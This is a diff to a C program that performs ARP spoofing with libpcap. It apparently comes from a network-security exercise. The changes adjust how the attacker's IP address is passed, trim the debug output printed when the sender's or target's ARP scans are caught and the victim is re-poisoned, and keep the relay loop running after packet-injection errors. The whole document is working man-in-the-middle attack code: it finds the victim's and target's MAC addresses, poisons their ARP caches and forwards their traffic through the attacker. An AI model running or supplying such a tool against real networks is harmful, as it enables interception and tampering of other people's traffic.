@@ -79,7 +79,7 @@ void print_ip(uint32_t p)
 	printf("\n");
 }
 
-int get_mac(uint8_t *packet_arp_req, pcap_t *handle, struct eth_header *eth, struct libnet_arp_hdr *arp, struct in_addr *send_ip, uint8_t *send_mac, uint8_t *my_mac, struct sockaddr_in *my_ip)
+int get_mac(uint8_t *packet_arp_req, pcap_t *handle, struct eth_header *eth, struct libnet_arp_hdr *arp, struct in_addr *send_ip, uint8_t *send_mac, uint8_t *my_mac, uint32_t my_ip)
 {
 
 	uint8_t *tmp = packet_arp_req;
@@ -115,7 +115,7 @@ int get_mac(uint8_t *packet_arp_req, pcap_t *handle, struct eth_header *eth, str
 			arp = (struct libnet_arp_hdr *)p;
 			p += sizeof(struct libnet_arp_hdr);
 			memcpy(send_mac, p, 6);
-			if ((memcmp(p + 6, send_ip, 4) == 0) && (memcmp(p + 10, my_mac, 6) == 0) && (*(uint32_t *)(p + 16) == ntohl(my_ip->sin_addr.s_addr)))
+			if ((memcmp(p + 6, send_ip, 4) == 0) && (memcmp(p + 10, my_mac, 6) == 0) && (*(uint32_t *)(p + 16) == my_ip))
 			{
 				printf("Captured ARP reply\n");
 				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
@@ -255,21 +255,21 @@ int main(int argc, char *argv[])
 	memcpy(packet_arp_req + sizeof(struct eth_header), (uint8_t *)arp, sizeof(struct libnet_arp_hdr));
 
 	memcpy(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr), my_mac, 6);
-	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 6) = htonl(my_ip->sin_addr.s_addr);
+	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 6) = my_ip->sin_addr.s_addr;
 	memset(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 10, 0, 6);
 	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = send_ip->s_addr;
 
 	//get send mac
 	uint8_t send_mac[6];
 	printf("ARP request sent(to sender)\n");
-	get_mac(packet_arp_req, handle, eth, arp, send_ip, send_mac, my_mac, my_ip);
+	get_mac(packet_arp_req, handle, eth, arp, send_ip, send_mac, my_mac, my_ip->sin_addr.s_addr);
 	printf("Sender(Victim) HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n\n", send_mac[0], send_mac[1], send_mac[2], send_mac[3], send_mac[4], send_mac[5]);
 
 	//get target mac
 	uint8_t target_mac[6];
 	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = target_ip->s_addr;
 	printf("ARP request sent(to target)\n");
-	get_mac(packet_arp_req, handle, eth, arp, target_ip, target_mac, my_mac, my_ip);
+	get_mac(packet_arp_req, handle, eth, arp, target_ip, target_mac, my_mac, my_ip->sin_addr.s_addr);
 	printf("Target HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n\n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
 
 	//arp spoof
@@ -297,28 +297,14 @@ int main(int argc, char *argv[])
 			//can handle broadcast & unicast
 			if ((memcmp(eth->src_mac, send_mac, 6) == 0) && (memcmp(p, send_mac, 6) == 0) && (memcmp(p + 6, send_ip, 4) == 0) && (memcmp(p + 16, target_ip, 4) == 0))
 			{
-				printf("Captured ARP scan\n");
-				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
-				{
-					printf("%02x ", *(packet + i));
-					if ((i & 0x0f) == 0x0f)
-						printf("\n");
-				}
-				printf("\n");
+				printf("Captured sender ARP scan\n");
 				arp_attack(packet_arp_atk, handle, eth, arp, target_ip, send_ip, send_mac, my_mac);
 			}
 			//eth header src mac = target, arp sender mac/ip = target, target ip = sender(target's arp scan)
 			//can handle broadcast & unicast
 			if ((memcmp(eth->src_mac, target_mac, 6) == 0) && (memcmp(p, target_mac, 6) == 0) && (memcmp(p + 6, target_ip, 4) == 0) && (memcmp(p + 16, send_ip, 4) == 0))
 			{
-				printf("Captured ARP scan\n");
-				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
-				{
-					printf("%02x ", *(packet + i));
-					if ((i & 0x0f) == 0x0f)
-						printf("\n");
-				}
-				printf("\n");
+				printf("Captured target ARP scan\n");
 				arp_attack(packet_arp_atk, handle, eth, arp, send_ip, target_ip, target_mac, my_mac);
 			}
 		}
@@ -329,8 +315,8 @@ int main(int argc, char *argv[])
 			memcpy(eth->dst_mac, target_mac, 6);
 			if (pcap_inject(handle, packet, header->caplen) == -1)
 			{
-				fprintf(stderr, "\n1Error sending the packet: %s\n", pcap_geterr(handle));
-				return -1;
+				fprintf(stderr, "\n1Error sending the packet: %s: %d Bytes\n", pcap_geterr(handle), header->caplen);
+				//return -1;
 			}
 		}
 		//relay target->sender
@@ -340,8 +326,8 @@ int main(int argc, char *argv[])
 			memcpy(eth->dst_mac, send_mac, 6);
 			if (pcap_inject(handle, packet, header->caplen) == -1)
 			{
-				fprintf(stderr, "\n2Error sending the packet: %s\n", pcap_geterr(handle));
-				return -1;
+				fprintf(stderr, "\n2Error sending the packet: %s: %d Bytes\n", pcap_geterr(handle), header->caplen);
+				//return -1;
 			}
 		}
 	}
